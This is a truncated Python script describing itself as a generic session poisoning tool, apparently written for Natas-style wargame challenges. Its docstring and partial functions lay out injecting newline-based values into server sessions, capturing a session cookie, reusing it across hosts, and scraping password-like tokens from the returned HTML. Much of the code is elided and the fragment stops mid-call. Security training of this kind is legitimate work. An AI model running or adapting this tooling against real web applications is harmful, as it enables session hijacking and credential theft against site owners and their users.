#!/usr/bin/env python3
"""
Generic session poisoning tool.

Supports two attack models:

1) single-host
   - Create a session on one URL
   - Inject a value into a parameter (e.g. newline-based poisoning)
   - Read the same URL again

2) cross-host
   - Create a session on an injection URL
   - Capture the session cookie
   - Inject arbitrary key=value pairs
   - Reuse the same cookie against a different read URL

Nothing in this script is tied to any specific challenge.
All behavior is controlled by CLI options.
"""
...
def extract_password(html: str):
    """
    Generic helper that tries to pull a password-like token from HTML.
    This is optional; if it fails, raw HTML is printed.
    """
    # Common Natas-like format
...
def solve_cross_host(session, args):
    """
    Two applications:
      - create session on inject URL
      - capture session cookie
      - poison session on inject URL
      - reuse cookie on read URL
    """

    # 1) establish session on inject host
    session.get(args.inject_url, timeout=args.timeout)
    ...
    # 4) force cookie reuse on read host
    r = session.get(
        args.read_url,
